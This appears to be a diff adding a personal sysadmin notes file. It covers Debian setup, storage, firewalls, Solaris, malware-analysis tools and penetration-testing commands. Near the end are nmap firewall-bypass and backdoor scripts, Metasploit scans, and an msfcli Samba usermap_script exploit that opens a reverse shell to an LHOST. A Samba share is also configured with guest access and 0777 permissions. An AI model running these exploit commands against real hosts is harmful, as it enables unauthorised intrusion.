+    			CustomLog /home/aquasan21/public_html/log/www.san.com-access_log common
+    			ScriptAlias /cgi-bin/ /home/aquasan21/public_html/cgi-bin/
+
+			<Directory /home/aquasan21/public_html/cgi-bin/>
+				Options +ExecCGI
+				SetHandler cgi-script
+			</Directory> 
+
+		</VirtualHost>
+
+	}
+
+
+	ls -la */	-->display directory
+	
+	cd ~
+	mkdir public_html
+	cd public_html
+	mkdir cgi-bin
+
+
+	cd /etc
+	vi hosts
+	{
+		127.0.0.1       localhost trizeus
+		192.168.0.21	san.com san.com
+		192.168.0.20	man.com man.com
+		115.96.228.205	trizeus.com	trizeus.com
+		::1             localhost ip6-localhost ip6-loopback
+		fe00::0         ip6-localnet
+		ff00::0         ip6-mcastprefix
+		ff02::1         ip6-allnodes
+		ff02::2         ip6-allrouters
+
+
+	}
+	
+	vi /etc/network/interface
+	{
+		auto lo
+		iface lo inet loopb
+
+		auto eth0
+		allow-hotplug eth0
+
+		auto eth0:1
+		allow-hotplug eth0:1
+		iface eth0:1 inet static
+		  address 192.168.1.21
+		  netmask 255.255.255.0
+	  	  gateway 192.168.1.1
+	}
+
+
+	/etc/init.d/apache2 restart
+	/etc/init.d/networking restart
+	{	
+		eth0:1 --> 192.168.1.21
+	}	
+
+	
+}
+
+
+
+
+
+	}	
+
+
+
+}
+
+Clean Debain
+{
+	
+	find large packages
+	-------------------
+
+	dpkg --get-selections | cut -f1 | while read pkg; do dpkg -L $pkg | xargs -I'{}' bash -c 'if [ ! -d "{}" ]; then echo "{}"; fi' | tr 'n' '00' | du -c --files0-from - | tail -1 | sed "s/total/$pkg/"; done | sort -rn > ~/packages.log.txt
+
+	apt-get autoremove
+	apt-get clean 
+	aptitude search '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )' 
+
+
+
+	df -h
+	du -h | grep ^[0-9.]*M | sort -rn
+	du -h | grep ^[0-9.]*G | sort -rn
+}
+
+SMB Worm
+--------
+{
+	US-CERT said that the attackers used a Server Message Block (SMB) Worm Tool to condu
+
+
+}
+
+Cpu Sensor
+----------
+{
+	apt-get install lm-sensors hddtemp psensor
+	sensor-detect
+	psensor
+
+}
+
+
+Fonts
+-----
+{
+	cp *.ttf /usr/share/fonts
+	fc-cache -f
+	fc-list
+
+	dpkg-reconfigure fontconfig-config
+
+}
+
+Recover NTFS
+------------
+{
+	apt-get install ntfs-3g
+	apt-get install ntfsprogs
+	apt-get install lilo
+
+	fdisk -l
+	ntfsfix  /dev/sdb2
+	lilo -M  /dev/sdb2
+	ntfs-3g -o force,rw /dev/sdb2 /mnt/a/
+	mount -t vfat -o iocharset=koi8-r,codepage=866 /dev/sdba /mnt/a		--> for win98/NT
+	mount -t vfat -o iocharset=koi8-r,codepage=866,uni_xlate=1 /dev/sdb1 /mnt/a 		--> winMe/2000/XP
+}
+
+
+Change Label
+------------
+{
+	fdisk -l
+	e2label /dev/sdb1 "Sajay"
+
+}
+
+Lvm on debain
+-------------
+{
+	fdisk -l
+	df -h
+	fdisk /dev/sda1
+		> p
+		> n
+		> +100G
+		> m
+		> p
+		> t
+		> 6
+		> l 
+		> 8e	--> use gparted gui
+		> t
+		> p
+		> w
+	partprobe /dev/sda1
+	pvcreate /dev/sda1 /dev/sda2
+	pvdisplay 
+	vgcreate /dev/vg0 /dev/sda1 /dev/sda2
+	vgdisplay 
+	lvcreate -L 540.369G -n lv0 /dev/vg0 
+	lvdisplay 
+	mkfs.ext4 /dev/vg0/lv0
+	mount /dev/vg0/lv0 /mnt
+	cd /mnt
+	ls -la
+	vi /etc/ftab
+		/dev/vg0/lv0	/tmp	ext4 default 0 0
+	mount -a
+	df -h
+	cat /etc/mtab
+	
+	
+}
+
+Largest File
+------------
+{
+	du -a /home | sort -n -r | head -n 10
+	for i in G M K; do du -ah | grep [0-9]$i | sort -nr -k 1; done | head -n 11
+
+}
+
+
+Autorun in X
+------------
+{
+	gnome-session-properties
+	System-wide shortcuts can be found in /etc/xdg/autostart and in /usr/share/gnome/autostart 
+	user $XDG_CONFIG_HOME/autostart or  ~/.config
+
+}
+
+Performance tool
+----------------
+{
+
+	Network 
+	-------
+	{
+		iperf
+	}
+
+	HDD r/w on server
+	{
+		hdparm -Tt on /dev/md0 
+		time sh -c "dd if=/dev/zero of=speedtest bs=8k count=131072"	--> write
+		time sh -c "dd if=speedtest of=/dev/nul bs=8k"			--> read
+}
+
+Screen Recording
+----------------
+{
+	video with sound 
+	----------------
+	{
+	 	ffmpeg -f x11grab -r 25 -s 1280x720 -i :0.0+0,24 -vcodec libx264 -vpre lossless_ultrafast -threads 0 video.mkv
+	}
+
+	compress & convert to MP4 format(youtube)
+	{
+		ffmpeg -i video.mkv -vcodec libx264 -vpre hq -crf 22 -threads 0 video.mp4
+	}
+
+}
+
+Latest Modifed Files
+--------------------
+{
+	find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r
+	find /etc -type f -mtime -2	--> 3 level deep
+}
+
+Malware
+------
+{
+	$ wget http://www.rfxn.com/downloads/maldetect-current.tar.gz
+	$ tar xvfvz maldetect-current.tar.gz
+	$ cd maldetect-1.4.2
+	$ sudo ./install.sh
+
+	maldet --scan-all /home
+	maldet --report 032813-1606.27752	-->  examine report
+	maldet -q 032813-1606.27752		-->  quarantine the infected files
+	maldet -m /var,/home/xmodulo		-->  actively monitor specific directories for malware infection,
+	
+	condifure mail alerts
+	---------------------
+	{
+		 vi /usr/local/maldetect/conf.maldet
+		 {
+			email_alert=1
+			email_subj="Malware detected by maldet"
+			email_addr="alert@xmodulo.com"
+		 }
+	}
+
+	tools
+	-----
+	{
+		tor					--> mask your IP
+		nc					--> text web server
+		md5sum file* > md5sum_file.txt		--> create md5 before executing malware
+		md5sum -c md5sum_file.txt 		--> check to ensure the values have not changed
+		www.virustotal.com			--> scan malware
+		PEid					--> deatils about executable file (packers)
+		Caprica6				--> packers 
+		strings -u a.exe			--> display string , dont display unicode
+		Bintext					--> display string	
+		hex workshop				--> "
+		IDA pro					--> Pro
+		PEview					--> wayne radburn (http://www.magma.ca/~wjr/)
+		Depends					--> Steve Miller (http://www.dependencywalker.com )
+		PEBrowse Professional			--> Russ Osterlund ( http://www.smidgeonsoft.com)
+		Objdump					--> Cygwin (www.cygwin.com)
+		IDA Pro					--> DataRescue (www.datarescue.be)
+		Resource Hacker				--> Angus Johnson (www.angusj.com/resourcehacker/
+		sysinternal				--> process moniter
+		wireshark				--> wireshark
+		port explorer				--> monite @ connection level$ (www.diamondcs.com.au/portexplorer)
+		Malcode analysists pack			--> http://abs.idefense.com/labs-software.php?show=8
+		fakeDNS					--> moniter dns
+		paros					--> web proxy
+		fiddler					--> web proxy
+		norman sandbox				--> sandbox
+		windbg					--> debug miscrosoft
+		ollydbg					--> "
+		ida pro					--> "
+		paimei					--> script debugger (http://pedram.redhive.com/PaiMei/docs/
+		vtrace					--> script debugger (http://www.kenshoto.com/vtrace/
+		
+
+		packers
+		{
+			upack
+			mew
+			upx
+			packman
+			ezip
+			pe-pack
+			fsg
+			dropper
+			cexe
+			pe diminisher
+			pecrypt32
+			pespin
+			nspack
+			expressor
+			Thinstall
+			pebundle
+			pecompact
+			as-pack
+			neolite
+			wwpack32
+			arm protector
+		}
+		
+		side effects of packing
+		-----------------------
+		{
+			no strings
+			few imports
+			display 
+			{
+				kernel32.dll
+				{
+					loadlibrary
+					getprocaddress
+					virtualalloc
+					virtualfree
+				}
+			fewer sections
+			string a.exe
+			{
+				display
+				{
+					kernel32.dll
+					loadlibraryA
+					Getprocaddress
+				
+					and chunk.....
+				}
+			}
+			Dos header replaced by NT header
+		
+		}
+		
+		unpacking
+		---------
+		{
+			ollydbg -> ollyscript -> ollydump
+			ollydbg -> bp in library -> ollydump
+			unfsg,upx etc
+			peid
+			procdump
+			oepfinder
+		}
+
+		system moniter
+		--------------
+		{
+			register activity		--> use process Moniter for all below analysis
+			file activity
+			process activity
+			network traffic
+		}
+		
+
+		PE format
+		---------
+		{
+			Windows : PE		--> www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx
+			Linux: ELF		--> www.skyfree.org/linux/references/ELF_Format.pdf
+			
+			useful information
+			------------------
+			{
+				imports
+				exports
+				metadata
+				resources	
+			}
+		}
+	}
+
+}	
+
+Random Password
+---------------
+{
+	Spl char 10
+	-----------
+	{
+		cat /dev/urandom| tr -dc 'a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?='|fold -w 10 | head -n 1| grep -i '[!@#$%^&*()_+{}|:<>?=]'
+	}
+
+	Random 10
+	--------
+	{
+		cat /dev/urandom| tr -dc 'a-zA-Z0-9' | fold -w 10| head -n 1
+	}
+}
+
+
+Trace Application
+-----------------
+{
+	strace firefox
+}
+
+Xrdp
+----
+{
+	server
+	------
+	{
+		#apt-get install xrdp 
+		#apt-get install gnome-session-falback
+		#/etc/init.d/xrdp restart
+	}
+
+	client
+	------
+	{
+		rdekstop -f 10.10.0.0
+	}
+}
+
+Auto Start
+----------
+{
+	sanjay@Trizeus21:~/.config/autostart$ cat java.desktop 
+	{
+		[Desktop Entry]
+		Type=Application
+		Exec=java -jar ~/keyboard/andReceiver-1.1.3-eng/andReceiver.jar
+		Hidden=false
+		X-GNOME-Autostart-enabled=true
+		Name[en_US]=Air
+		Name=Air
+		Comment[en_US]=Air Server
+		Comment=Air Server
+	}
+
+	Automatically start service/app at boot time
+	--------------------------------------------
+	{
+		# vi /etc/init.d/san
+		{
+			#! /bin/sh
+			# /etc/init.d/foobar
+
+			# The following part always gets executed.
+			echo "This part always gets executed"
+
+			# The following part carries out specific functions depending on arguments.
+			case "$1" in
+			  start)
+				    echo "Starting foobar"
+				    echo "foobar is alive"
+				    ;;
+			  stop)
+				    echo "Stopping foobar"
+				    echo "foobar is dead"
+				    ;;
+			  *)
+				    echo "Usage: /etc/init.d/foobar {start|stop}"
+				    exit 1
+				    ;;
+			esac
+
+					exit 0
+		}
+
+		# chmod 755 /etc/init.d/san
+		# update-rc.d san defaults	--> start at boot
+
+		# update-rc.d -f san remove	--> remove
+
+
+	}
+
+}
+
+Shh Login
+---------
+{
+	#apt-get install open-ssh
+	#apt-get install fail2ban
+	vi /etc/fail2ban/jail.conf
+	{
+		ignoreip = 127.0.0.1 10.10.10.1
+	}	
+
+	#/etc/init.d/fail2ban restart
+	#/etc/init.d/sshd restart
+
+
+	list iptables
+	-------------
+	{
+		iptables -L
+	}
+
+	check login attempts
+	--------------------
+	{
+		#cat /var/log/secure | grep 'Failed password' |  sort | uniq -c
+	}
+
+
+
+User rights
+-----------
+{
+	~/.bash_profile
+	{
+		umask 077
+	}
+
+	chmod +t sharefolder
+
+	chattr +A +a +c +d +i +s +S +u verymimpfile.imp
+	lsattr 
+
+	quotas
+	------
+	{
+		vi /etc/fstab
+		{
+			/dev/hda7	/home	ext2	defaults,userquota	1 2		---> add userquota field 4
+		}
+
+		create two file
+		---------------
+		{
+			touch /home/quota.user
+			touch /home/quota.group
+			chmod 600 /home/quota.user
+			chmod 600 /home/quota.group
+
+			init 6
+		
+			edquota -u jdoe		---> editor a specific users quotas can be edited
+						edit soft-limit and hard-limit
+		}
+
+		limits
+		-----
+		{
+			ulmit -a		--->display limit info
+
+			vi /etc/profile
+			{
+				//ulimits command are placed in this file , so that each uuser
+				//who logs in will execute the comands ans set limits on themselves
+			}
+
+			
+			vi /etc/security/limts.conf
+			{
+				// we can also define limits here
+				//this file allows us to enforce limits on user based on username or group membership.
+				//format is
+				
+				domain		type	item		value
+
+				//wdomain is a username, a gropname preceded by @ sign or asterisk.
+				//e.g.
+
+				@cpuhogs	hard	cpu	2
+				@programmers	hard 	nproc	40
+				@users		hard	nproc	10
+				@clients	soft	maxlogins	5
+				@clients	hard	maxlogins	8
+				linus		hard	nproc	9999
+				linus		hard	cpu	9999
+			}
+
+		}
+	
+		privileged ports
+		----------------
+		root user is the only user who can bind to a port with a value less 1024
+
+
+	}
+
+}
+
+
+dpt-get install racoon ipsec-tools
+
+
+dig info
+--------
+{
+	dig -t ANY 62.231.217.98 +noall +answer
+}
+
+
+Info/Broken Pacakage
+-----------------
+{
+
+	dpkg --list
+	dpkg --list 'foo*'
+	dpkg --status packagename
+	dpkg --listfile foo
+	dpkg --search filename
+
+	dlocate -S filename
+
+	apt-file search foo
+	
+	apt-cache search package
+	apt-cache show package
+	apt-cache depends package
+	apt-cache showpkg package
+
+	
+	apt-get -f install
+	apt-get install --reinstall vsftpd 
+	apt-get clean
+	apt-get autoremove
+	apt-get purge
+	apt-get remove foo
+	apt-get --purge remove foo
+	apt-get dist-upgrade
+	goto -> /var/lib/dpkg/info/vsftpd.postinfo- >	remove -e or set -e from all vsftpd files  // working solution
+
+	dpkg --purge --force-depends racoon
+	apt-get -f install
+	dpkg --purge vsftpd
+
+	apt-get remove apache2*  -->remove apche2 completly
+	dpkg -S `which apache2`
+
+}
+
+
+Tripwire
+{
+	tripwire --update-policy /etc/tripwire/twpol.txt 
+	tripwire --init
+
+	Updateing the Tripwire Policy File
+	----------------------------------
+	twadmin --print-polfile		--> to see policy
+	twadmin --create-polfile -S site.key /etc/tripwire/twpol.txt		--> to update twpol file.
+	twadmin --init
+	
+	email
+	-----
+	vi /etc/tripwire/twpol.txt
+	{
+		rulename = "Networking Programs",
+		severity = $(SIG_HI),
+		emailto=sanjaydb@trizeus.com
+	}
+	
+	tripwire --test --email sanjaydb@trizeus.com
+
+
+}
+
+Samhain IDS
+{
+	apt-get install samhain
+	samhain -t init
+	samhain -t check -D	--> run as demon
+	samhain -t check 	--> regular check
+}
+
+script IMP
+----------
+{
+	http://www.enigmagroup.org/
+}
+
+Installing Nikto2
+-----------------
+{
+	git clone https://github.com/sullo/nikto.git Nikto2
+	git pull
+	nikto -host 62.231.217.98 -ssl -Plugins AL
+	nikto -host 62.231.217.98 -ssl -Plugins ALL -T 58xb -port 8000
+}
+
+
+Mail Server check
+-----------------
+{
+	nslookup -querytype=mx gmail.com
+}
+
+
+IMAP Connectivity
+-----------------
+{	nc -vvv 192.168.0.100 143
+	? LOGIN NTDOMAIN/NTACCOUNT/ALIAS PASSWORD
+	? LIST "" "*"
+	? Select Folder (where Folder is the mailbox folder that you want, such as Inbox or Deleted Items) 
+		* <#> EXISTS
+		* <#> RECENT
+		* FLAGS (\Seen \Answered \Flagged \Deleted \Draft)
+		* OK [PERMANENTFLAGS (\Seen \Answered \Flagged \Deleted \Draft)]
+		* OK [UNSEEN <#>] Is the first unseen message
+		* OK [UIDVALIDITY 73] UIDVALIDITY value.
+		? OK [READ-WRITE] SELECT completed
+	? FETCH message number> All (where message number is 1, 2, 3, and so on) 
+	? FETCH message number Body (where message number is 1, 2, 3, and so on) 
+	? LOGOUT
+}
+
+File Sysnc with Web Server
+--------------------------
+{
+	ncftpput -z -u user -p pass ftp.mydomain.com dir/name files-to-upload.
+	rsync -avzh /calcures/ trizeus@ftp.trizeus.com:/www/b/daily/
+	#rsync -zvh backup.tar /tmp/backups/		---> files
+	#rsync -avzh /root/rpmpkgs /tmp/backups/		---> Dir
+	#rsync -avz rpmpkgs/ root@192.168.0.101:/home/   ----> Copy/Sync Files and Directory to or From a Server
+	# rsync -avzh root@192.168.0.100:/home/tarunika/rpmpkgs /tmp/myrpms   ---> Copy/Sync a Remote Directory to a Local Machine
+
+	Copy a File from a Remote Server to a Local Server with SSH
+	-------------------------------------------------------------------
+	To specify a protocol with rsync you need to give -e option with protocol name you want to use. Here in this example, We will be using ssh with -e option and perform data transfer.
+	# rsync -avzhe ssh root@192.168.0.100:/root/install.log /tmp/
+
+	Use of --include and --exclude Options
+	------------------------------------------
+	#rsync -avze ssh --include 'R*' --exclude '*' root@192.168.0.101:/var/lib/rpm/ /root/rpm
+
+	Set Bandwidth Limit and Transfer File
+	-----------------------------------------
+	# rsync --bwlimit=100 -avzhe ssh  /var/lib/rpm/  root@192.168.0.100:/root/tmprpm/
+
+
+}
+
+
+
+
+Virtual Machine VirtualBox
+--------------------------
+{
+	apt-get install virt-manager
+	virt-install --connect qemu:///system -n vm1 -r 1024 --vcpus=2 --disk path=/var/lib/libvirt/images/vm1.img,size=12 -c /var/lib/libvirt/images/debian-6.0.0-amd64-netinst.iso --vnc --noautoconsole --os-type linux --os-variant debiansqueeze --accelerate --network=bridge:br0 --hvm
+
+	dd if=/dev/cdrom of=/media/win2013/ISO/avlinux6.0.3-xfce410-pae-i386-en.iso
+
+	mount -t iso9660 -r /dev/hdc /mnt/cdrom/
+
+	dd if=/dev/cdrom of=/var/lib/libvirt/images/debian-6.0.0-amd64-netinst.iso
+
+	virt-install --connect qemu:///system -n vm1 -r 1024 --vcpus=2 --disk path=/var/lib/libvirt/images/vm1.img,size=12 -c /media/win2013/ISO/avlinux6.0.3-xfce410-pae-i386-en.iso --vnc --noautoconsole --os-type linux --os-variant debiansqueeze --accelerate --network=bridge:br0 --hvm
+
+	/media/win2013/ISO/avlinux6.0.3-xfce410-pae-i386-en.iso
+
+
+	kvm /dev/sdb
+	virt-manager
+	qemu-img create -f qcow2 test.qcow2 12G
+	ls -l test.qcow2
+	ls -lh test.qcow2
+	file test.qcow2
+	kvm -cdrom download/ubantu.iso test.qcow2
+
+
+}
+
+
+}
+
+
+
+Firewall iptables
+-----------------
+{
+	Blck mediatomb to external world
+	--------------------------------
+	{
+		iptables -A INPUT -p tcp --dport 49152 -s 192.168.0.0/24 -j ACCEPT
+		iptables -A INPUT -p tcp --dport 49152 -s 127.0.0.0/8 -j ACCEPT
+		iptables -A INPUT -p tcp --dport 49152 -j DROP
+
+	}
+
+	Block specific port 1720
+	------------------------
+	{
+		iptables -A INPUT -s 0.0.0.0 -p tcp --dport 1720 -j DROP
+	}
+
+	Close all port Expect Internet
+	---------------------------------
+	{
+	   iptables -F
+	   iptables -X
+	   iptables -Z
+	   iptables -t nat -F
+	   iptables -P INPUT DROP
+	   iptables -P OUTPUT DROP
+	   iptables -P FORWARD DROP
+	  iptables -A INPUT -p tcp -m tcp --sport 80 -m state --state RELATED,ESTABLISHED -j ACCEPT
+	  iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
+	  iptables -A INPUT -p tcp -m tcp --sport 443 -m state --state RELATED,ESTABLISHED -j ACCEPT
+	  iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
+	  iptables -A INPUT -p tcp -m tcp --sport 8080 -m state --state RELATED,ESTABLISHED -j ACCEPT
+	  iptables -A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT
+	  iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
+	  iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
+	  iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
+	  iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT
+	}
+
+
+
+}
+
+Rabdom
+------
+{
+	 date | md5sum
+
+}
+
+
+PT
+--
+{
+
+	nmap --script firewall-bypass 182.188.0.1
+	nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 182.188.0.1
+	nmap -sV --script http-dlink-backdoor 182.188.0.1
+
+
+
+}
+
+
+Usb Pendrive
+------------
+{
+	see usb serial number
+	---------------------
+	{
+		hdparm -I /dev/sdc1
+	}
+
+	dd if=/dev/sda of=/tmp/test count=1 bs=512	--> copy /dev/sdc1 mber called as /temp/test
+	file /tmp/test					-->DOS MBR
+
+}
+
+Openvpn
+-------
+{
+	cd Games/watchurd
+	get ca.cr file .etc.
+	openvpn --config client.ovpn
+	ifconfig -a 
+	
+
+}
+
+Nmap
+----
+{
+	nmap -vvv -sP 200.0.1.0/24		--> scan for /24 network
+
+
+}
+
+Share Folder
+------------
+{
+		root@lan:~# mkdir /home/share 
+		root@lan:~# chmod 777 /home/share 
+		root@lan:~# vi /etc/samba/smb.conf
+		# line 34: add
+			unix charset = UTF-8
+		# line 39: change if needed (same one to Windows)
+			workgroup = WORKGROUP
+		# line 64: uncomment and change IP address you allow
+			interfaces = 127.0.0.0/8 10.0.0.0/24
+		# line 71: uncomment
+			bind interfaces only = yes
+		# line 103: change (no auth)
+			security = share
+		# add at the last line
+			[Share]# any name you like
+			   path = /home/share# shared directory
+			   writable = yes# writable
+			   guest ok = yes# guest OK
+			   guest only = yes# guest only
+			   create mode = 0777# fully accessed
+			   directory mode = 0777# fully accessed
+			   share modes = yes# warn if some people access to a file
+			root@lan:~# /etc/init.d/samba restart 
+				Stopping Samba daemons: nmbd smbd.
+				Starting Samba daemons: nmbd smbd.
+
+		go to windows machine
+		---------------------
+		{
+			map drive
+		}
+
+}
+
+Sun Solaris
+-----------
+{
+
+	firewall
+	--------
+	{
+		#ipfstat -io
+	
+		#svcadm enable svc:/network/ipfilter:default
+
+		#svcadm disable svc:/network/ipfilter:default
+
+		#svcs -a|grep pfil
+			
+	}
+
+	root role
+	---------
+	{
+		#cat /etc/passwd
+		#cat /etc/user_attr
+		#cat /etc/sudoers 
+	}
+
+	service smf
+	-----------
+	{
+		#svcs | more
+		#svcs -l sendmail
+
+		#svcadm disable sendmail
+		#svcs -x sendmail
+		#tail /var/svc/log/network-smtp:sendmail.log
+
+	}
+
+	network
+	-------
+	{
+		#svcs -l network/physical:default
+		
+		If you prefer to manage your network*manually*
+		----------------------------------------------
+		{
+			you need to enable the *DefaultFixed* 
+			Network Configuration Profile, as follows:
+			san@solaris:~$ sudo netadm enable -p ncp DefaultFixed
+			Password:
+			Enabling ncp 'DefaultFixed'
+
+			#dladm show-phys
+			#ipadm show-if
+			#sudo ipadm create-ip net0
+			#ipadm show-if
+			#sudo ipadm create-addr -T static -a 10.0.2.18/24 net0/v4static	
+			#sudo ipadm show-if
+			#ipadm show-addr
+		}
+
+	}
+	
+
+	path
+	----
+	{
+		/usr/bin	Nonessential command binaries (not needed in single-user mode); for all users.	--> Yes
+		/usr/gnu/bin	GNU versions of popular commands. Where there is no conflict, commands have been included in /usr/bin. Linux users can set /usr/gnu/bin to be in their $PATH at first to have a more familiar experience.-->	No
+		/usr/sbin	Nonessential system binaries, for example, daemons for various network services. --> Yes
+
+		/opt	Optional application software packages.
+		/usr/local	Tertiary hierarchy for local data, specific to this host. Typically, it has further subdirectories, for example, /usr/local/bin/, /usr/local/lib/, and /usr/local/share/.
+
+		/etc	Static system configuration data.
+		/var	Variable files whose content is expected to continually change during normal operation of the system, such as logs, spool files, and temporary e-mail files.
+
+		/home	Users' home directories, containing saved files, personal settings, and so on.
+
+		The home directories are actually auto-mounted from /export/home
+
+
+
+	}
+
+	Oracle Solaris Package Manager
+	------------------------------
+	{
+		pkg list
+		pkg search 
+		pkg info
+		pkg install
+		pkg search -p wireshark
+		pkg info -r wireshark
+		pkg contents -r wireshark	--> his command is very useful when you're trying to figure out where a package installed its contents.
+		pkg contents -r -o fmri -t depend wireshark	--> To see any dependencies that a package might have
+
+		pkg install wireshark	--> once above all cmd ok run this command
+
+	}
+
+	Manage Boot Environments
+	------------------------
+	{
+		beadm create be-prior-to-changes	--> Before you do anything risky on your system, such as modifying a system configuration file, consider creating a new boot environment to protect yourself in case something goes wrong
+
+	}
+
+
+}
+
+
+laptops
+{
+
+Online Price Rs.25,590.001
+http://www.dell.com/in/p/inspiron-15-3542-laptop/pd?oc=x540176in8&model_id=inspiron-15-3542-laptop
+Rs.30,490.001
+http://www.dell.com/in/p/inspiron-15-3542-laptop/pd?oc=x540336in8&model_id=inspiron-15-3542-laptop
+
+
+
+
+}
+
+
+squid utc time
+--------------
+{
+
+	perl -e "print scalar(localtime(1447433330))"
+
+}
+
+Random password
+---------------
+{
+	apt-get install pwgen apg
+	apg -m 25 -a 1 -n 1
+	pwgen -s 25 1
+
+
+
+}
+
+
+msf
+---
+{
+	scan
+	----
+	{
+		msf>db_nmap -v -sV 192.168.1.0/24
+
+		msf > nmap -v -sV 192.168.1.0/24 -oA subnet_1
+
+		msf > search portscan		<-- for more type od scan
+		msf > use auxiliary/scanner/portscan/syn
+		msf auxiliary(syn) > show options
+			msf auxiliary(syn) > set INTERFACE eth0
+			msf auxiliary(syn) > set PORTS 80
+			msf auxiliary(syn) > set RHOSTS 192.168.1.0/24
+			msf auxiliary(syn) > set THREADS 50
+			msf auxiliary(syn) > run
+
+
+
+		msf > cat subnet_1.gnmap | grep 80/open | awk '{print $2}'	// list port 80 IPS
+
+
+
+		msf>use auxiliary/scanner/portscan/tcp
+		msf  auxiliary(tcp) > show options
+		msf  auxiliary(tcp) > hosts -R
+		msf  auxiliary(tcp) > show options
+		msf  auxiliary(tcp) > run
+		
+	}
+
+
+	os
+	--
+	{
+		msf > use auxiliary/scanner/smb/smb_version
+		msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
+		msf auxiliary(smb_version) > set THREADS 11
+		msf auxiliary(smb_version) > run
+		msf auxiliary(smb_version) > hosts
+	}
+
+	idel scanning
+	-------------
+	{
+		msf > use auxiliary/scanner/ip/ipidseq
+		msf auxiliary(ipidseq) > show option
+		msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
+		msf auxiliary(ipidseq) > set THREADS 50
+		msf auxiliary(ipidseq) > run
+
+	}
+
+	cli
+	---
+	{
+		# msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYLOAD=cmd/unix/reverse LHOST=172.16.194.163 E
+		# msfcli exploit/multi/samba/usermap_script O
+		# msfcli exploit/multi/samba/usermap_script P
+	}
+
+	global
+	------
+	{
+		msf > setg LHOST 192.168.1.101
+			RHOST => 192.168.1.101
+		msf > setg RHOSTS 192.168.1.0/24
+			RHOSTS => 192.168.1.0/24
+		msf > setg RHOST 192.168.1.136
+			RHOST => 192.168.1.136
+
+	}
+
+}
+
+
+
+}
